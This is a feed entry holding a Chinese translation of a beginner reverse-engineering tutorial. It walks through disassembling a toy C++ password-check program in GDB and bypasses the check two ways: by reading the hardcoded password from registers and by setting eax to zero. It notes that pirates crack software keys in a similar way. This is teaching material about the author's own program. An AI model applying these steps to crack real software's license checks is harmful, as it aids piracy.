    <content type="html"><![CDATA[<h2 id="序幕"><a href="#序幕" class="headerlink" title="序幕"></a>序幕</h2><p>这个Ground Zero系列适合初学者入门使用，让他们进入逆向工程领域。因为这是x64的时代，所以我跳过了x86体系结构。但是你要知道，所有将用c++编写的示例也可以编译为x86，但是我将把它作为作业留给你们。如果你没有任何经验，也无所谓了。你唯一需要的就是有对编程语言的基本理解。<br>开始时，我们将编写一个简单的c++程序，它将提示用户输入密码。它将检查密码是否匹配，如果它正确，它将提示正确，否则将提示错误。我举这个例子的主要原因是，这个例子将让你了解<code>jump</code>，以及其他类似的条件在汇编语言中是如何工作的。另一个原因是，大多数具有硬编码键的程序都可以用类似的方式破解，只不过需要更多的数学知识，而这正是大多数盗版分销商如何破解合法软件并传播密钥的方式。<br>让我们先了解一下我们编写的c++程序。所有的代码都将托管在我的Github页面中：<br><a href="https://github.com/paranoidninja/ScriptDotSh-Reverse-Engineering" target="_blank" rel="noopener">https://github.com/paranoidninja/ScriptDotSh-Reverse-Engineering</a></p><p><img src="https://p1.ssl.qhimg.com/t0165944dc182584b5b.png" alt=""></p><p>这里的代码非常简单。我们的程序将一个参数作为密码输入，如果我不输入任何密码，它将打印help命令。如果我指定了一个密码，它会以10个字节的字符形式存储，并将密码发送到<code>check_pass()</code>函数。我们的硬编码密码是<code>check_pass()</code>函数中的<code>PASSWORD1</code>。在这里，我们的密码与<code>strcmp90</code>函数的实际密码变量<code>mypass</code>进行比较。如果密码匹配，则返回零，否则返回1。返回到我们的主功能，如果我们接收到1，它会打印错误的密码，否则会打印正确的密码。</p><p><img src="https://p2.ssl.qhimg.com/t01db5dfd877f783341.png" alt=""></p><p>现在，让我们在GDB调试器中找到这个代码。用GDB执行二进制文件，将首先在<code>main</code>中设置一个断点，然后再发送参数。其次，我们会让<code>enable time</code>在我们的GDB上运行，所以如果我们走错了一步，我们可以逆转这一步。这可以通过以下命令完成：<code>target record-full</code>和<code>reverse-stepi / nexti</code></p><p><img src="https://p2.ssl.qhimg.com/t0126b47001ec4a0b9b.png" alt=""></p><p>如果你不明白这一点，问题不大。你只需关注<code>gdb $</code>部分，就像你上面看到的那样，在给断点使用<code>break main</code>之后，我输了一个错误的密码<code>pass123</code>。我的编译过的代码应该如前所述打印一个不正确的密码，但是随着我们继续，我们会找到两种方法来绕过代码; 一种是通过从内存中取出实际密码，二是通过修改跳转值并打印密码正确。</p><h2 id="反汇编"><a href="#反汇编" class="headerlink" title="反汇编"></a>反汇编</h2><p>下一步是反汇编整个代码，看看到底发生了什么： </p><p><img src="https://p3.ssl.qhimg.com/t01cdc172e3a5a43676.png" alt=""></p><p>我们在整个反汇编代码中的主要关注以下几点：</p><p>1.<code>je</code> - <code>je</code>表示如果相等就跳转到某个地址，如果不相等，继续下一步。<br>2.<code>call</code>-调用一个新的函数。请记住，在加载完成后，反汇编代码将从主反汇编函数更改为新函数的反汇编代码。</p><ol start="3"><li><code>test</code> - 检查两个值是否相等</li><li><code>cmp</code>- 比较两个值</li><li><code>JNE</code> - 如果它不等于某物，jne就意味着跳转。否则，继续下一步。</li></ol><p>有些人可能会问，既然我们有<code>cmp</code>，我们为什么要进行<code>test</code>呢?答案可以在这里找到，解释得很漂亮:<br><a href="https://stackoverflow.com/questions/39556649/linux-assembly-whats-difference-between-test-eax-eax-and-cmp-eax-0" target="_blank" rel="noopener">https://stackoverflow.com/questions/39556649/linux-assembly-whats-difference-between-test-eax-eax-and-cmp-eax-0</a></p><p>所以，如果我们看到上面的反汇编代码，我们知道如果我们运行没有密码或参数的二进制文件，它将打印帮助，否则将继续检查密码。所以这个<code>cmp</code>应该是检查我们是否有参数的部分。如果一个参数不存在，它将继续打印帮助，否则它将跳转到<code>&lt;main + 70&gt;</code>。如果你在左边的地址旁边看到那些数字，我们可以看到在<code>&lt;+70&gt;</code>处，我们正在将某些东西移动到<code>rax</code>寄存器中。所以，我们要做的是我们将在<code>je</code>上设置一个断点，方法是指定它的地址<code>0x0000000000400972</code>，然后看看它是跳转到<code>&lt;+70&gt;</code>通过要求它继续<code>c</code>。GDB命令<code>c</code>将继续运行二进制文件，直到遇到另一个断点。</p><p><img src="https://p3.ssl.qhimg.com/t019b5d1fcd776dc33b.png" alt=""></p><p>而现在，如果您执行的是<code>step</code>迭代的<code>stepi</code>，它将执行一次迭代执行，并且它应该将您带到<code>&lt;+70&gt;</code>它将<code>Quad Word</code>移入<code>rax</code>寄存器的位置。</p><p><img src="https://p3.ssl.qhimg.com/t01d5a7a0d7e8592bc1.png" alt=""></p><p>我们的逻辑到现在为止都是正确的，现在我们来看下一个有趣的东西，也就是调用部分。如果你看到它旁边，它上面写着类似于<code>&lt;_Z10check_passPc&gt;</code>，它就是我们的<code>check_pass()</code>函数。让我们跳到使用<code>stepi</code>，看看函数里面是什么。一旦你跳到<code>check_pass()</code>函数并反汇编它，你会看到一组新的反汇编代码，它就是<code>check_pass()</code>函数本身的代码。这里有四行有趣的代码：</p><p><img src="https://p3.ssl.qhimg.com/t01a9eb4a8a425d69ee.png" alt=""></p><p>第一部分是将<code>rdx</code>寄存器的值移至<code>rsi</code>并将<code>rax</code>移至<code>rdi</code>。下一部分是调用<code>strcmp()</code>函数，它是C ++的字符串比较函数。接下来，我们有测试这两个值进行比较，如果这两个值相等，我们跳（<code>JE</code>）到<code>&lt;_Z10check_passPc + 77&gt;</code>将0移动到<code>EAX</code>寄存器。如果值不相等，函数将继续在<code>&lt;+70&gt;</code>处继续并在<code>eax</code>寄存器赋值1。现在，这些只不过是我们先前在<code>check_pass()</code>函数中指定的返回值。由于我们输入了无效密码，将发送的返回值为1。但是如果我们可以将返回值修改为零，那么它将输出为“正确的密码”。</p><p>另外，我们可以继续检查被移动到<code>rsi</code>和<code>rdi</code>寄存器中的内容。所以，让我们在那里放置一个断点并直接跳到它。</p><p><img src="https://p0.ssl.qhimg.com/t01de5fefd77f5b7a0e.png" alt=""></p><p>从上图可以看出，我使用了<code>x / s $ rdx</code>和<code>x / s $ rax</code>命令从寄存器中获取值。<code>x / s</code>表示检查寄存器并将其显示为一个字符串。如果你想以字节为单位获得它，你可以指定<code>x / b</code>，或者如果你想要字符，你可以指定<code>x / c</code>等等。然而，有多种变化。现在我们获取密码的第一部分已经在这里了。但是，让我们看看我们如何将<code>&lt;_Z10check_passPc + 70&gt;</code>处的返回值修改为零。所以，我们会拍摄stepi并跳到这个迭代。</p><p><img src="https://p4.ssl.qhimg.com/t01f33946211673bae8.png" alt=""></p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>正如您在上面看到的，函数在二进制中将<code>0x1</code>移到<code>eax</code>，但是在它可以做一个<code>je</code>之前，我们使用<code>set $eax = 0x0</code>将值修改为<code>0x0</code>，然后继续使用<code>c</code>作为下面的函数，瞧!!!我们有一个返回的值作为正确的密码!</p><p><img src="https://p4.ssl.qhimg.com/t01f64a6e72bae59f2a.png" alt=""><br>这只是一个简单的例子，让您开始逆向工程。随着我们深入，我们将看到套接字函数，运行时加密，编码隐藏的域名等等。这整个过程可以在Windows中使用Olly调试器完成，我将在下一篇博文中展示。</p><p>原文地址:<a href="https://scriptdotsh.com/index.php/2018/04/09/ground-zero-part-1-reverse-engineering-basics/" target="_blank" rel="noopener">https://scriptdotsh.com/index.php/2018/04/09/ground-zero-part-1-reverse-engineering-basics/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;序幕&quot;&gt;&lt;a href=&quot;#序幕&quot; class=&quot;headerlink&quot; title=&quot;序幕&quot;&gt;&lt;/a&gt;序幕&lt;/h2&gt;&lt;p&gt;这个Ground Zero系列适合初学者入门使用，让他们进入逆向工程领域。因为这是x64的时代，所以我跳过了x86体系结构。但是你要知道，所
      
    
    </summary>
    
    
      <category term="安全客弃婴" scheme="https://threst.github.io/tags/%E5%AE%89%E5%85%A8%E5%AE%A2%E5%BC%83%E5%A9%B4/"/>
    
  </entry>
  
</feed>
